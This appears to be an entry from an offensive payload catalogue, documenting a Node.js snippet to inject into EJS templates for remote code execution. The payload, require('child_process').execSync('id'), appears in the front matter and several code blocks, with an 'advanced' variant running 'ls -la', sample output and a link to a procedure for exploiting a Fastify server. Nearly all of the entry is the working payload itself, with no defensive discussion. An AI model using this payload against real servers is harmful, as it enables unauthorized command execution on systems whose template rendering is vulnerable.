---
data: require("child_process").execSync("id").toString()
tags:
  - rce
  - ejs-payload
type: command
output: null
executor: javascript
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.755Z'
id: 08ed195e-1238-4c55-ba9d-6a07d6d53550
verified: false
validated: true
submitted: true
---
# js-execsync-id

## Command

```javascript
require("child_process").execSync("id").toString()
```

## Description

Node.js code snippet injected into EJS template to synchronously execute the 'id' system command and return its output as a string, used for RCE demonstration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| "id" | System command to execute | Yes |

## Examples

### Basic Usage

```javascript
require("child_process").execSync("id").toString()
```

### Advanced Usage

```javascript
require("child_process").execSync("ls -la").toString()
```

## Expected Output

uid=1000(nullprophet) gid=1000(nullprophet) groups=... (user-specific).

## Related

- [[Related Procedure: Launch-and-Exploit-Fastify-Server-for-RCE]]
